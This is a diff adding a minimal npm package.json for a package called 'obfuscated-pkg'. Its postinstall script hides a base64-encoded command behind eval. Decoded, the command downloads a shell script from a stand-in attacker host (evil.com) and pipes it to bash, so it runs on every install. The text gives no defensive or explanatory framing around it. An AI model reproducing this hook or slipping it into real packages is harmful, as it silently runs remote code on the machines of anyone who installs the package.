@@ -1,0 +1,7 @@
+{
+  "name": "obfuscated-pkg",
+  "version": "3.0.0",
+  "scripts": {
+    "postinstall": "eval $(echo 'Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo' | base64 -d)"
+  }
+}
